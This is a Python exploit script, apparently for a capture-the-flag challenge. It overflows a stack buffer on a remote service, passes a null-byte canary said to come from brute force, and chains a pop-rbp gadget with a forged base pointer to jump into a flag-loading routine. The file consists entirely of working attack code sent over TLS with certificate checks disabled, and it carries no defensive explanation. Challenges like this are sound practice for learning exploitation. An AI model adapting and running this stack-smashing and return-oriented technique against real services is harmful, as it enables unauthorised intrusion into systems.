
import socket
import ssl
import time
import sys

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

# Canary from brute force (Nulls)
CANARY = b"\x00" * 8
BUF_TO_CANARY = 40

# RBP Gadgets
POP_RBP = 0x40141d
TARGET_RBP = 0x404154  # Points to 0x404140 (value 4) + 0x14
# Jump straight to setting edi in load_flag (skipping popen)
# 401bdd:	8b 45 ec             	mov    -0x14(%rbp),%eax
# 401be0:	89 c7                	mov    %eax,%edi
# 401be2:	e8 bc fd ff ff       	call   4019a3 <play_game>
JUMP_ADDR = 0x401bdd 

payload = (
    b"A" * BUF_TO_CANARY
    + CANARY
    + b"B" * 8                  # Fake saved RBP for greet_user
    + (POP_RBP).to_bytes(8, "little")
    + (TARGET_RBP).to_bytes(8, "little")
    + (JUMP_ADDR).to_bytes(8, "little")
)

def attempt():
    try:
        raw = socket.create_connection((HOST, PORT), timeout=5)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(raw, server_hostname=HOST)
        
        # Init
        ss.sendall(str(len(payload)).encode() + b"\n")
        
        # Wait for prompt
        buf = b""
        prompt_found = False
        start_t = time.time()
        while time.time() - start_t < 3:
            try:
                chunk = ss.recv(1024)
                if not chunk: break
                buf += chunk
                if b"what is your name?" in buf:
                    prompt_found = True
                    break
            except: break
            
        if not prompt_found:
            print("Failed to get prompt")
            ss.close()
            return

        ss.sendall(payload)

        # Read intro
        buf = b""
        ss.settimeout(2.0)
        start_t = time.time()
        while time.time() - start_t < 3:
            try:
                chunk = ss.recv(4096)
                if not chunk: break
                buf += chunk
                if b"Santa is missing" in buf:
                    print("INTRO RECEIVED (Canary check passed!)")
                    # Clear buffer to see menu cleanly?
                    buf = b""
                    break
            except: pass
        
        print(f"Buffer dump: {buf}")

        # If RBP exploit works, we should see the menu from play_game
        # "Where do you want to search?"
        # Read more
        try:
             while True:
                chunk = ss.recv(4096)
                if not chunk: break
                print(chunk.decode(errors='replace'), end='')
        except: pass

        ss.close()
    except Exception as e:
        print(f"Error: {e}")

attempt()
